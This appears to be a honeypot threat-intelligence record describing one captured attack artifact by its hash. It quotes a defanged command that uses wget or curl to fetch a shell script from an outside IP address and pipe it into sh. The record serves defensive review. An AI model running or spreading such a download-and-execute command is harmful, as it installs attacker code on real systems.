# 3a302031f24cb9b0f4a5f3772c3894fdc5afeb000dbe3227afdcb7d92b8a313f

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `3a302031f24cb9b0f4a5f3772c3894fdc5afeb000dbe3227afdcb7d92b8a313f` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
(wget --no-check-certificate -qO- hxxps://14[.]46[.]136[.]XXX/sh || curl -sk hxxps://14[.]46[.]136[.]XXX/sh) | sh -s apache[.]selfrepPOS
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
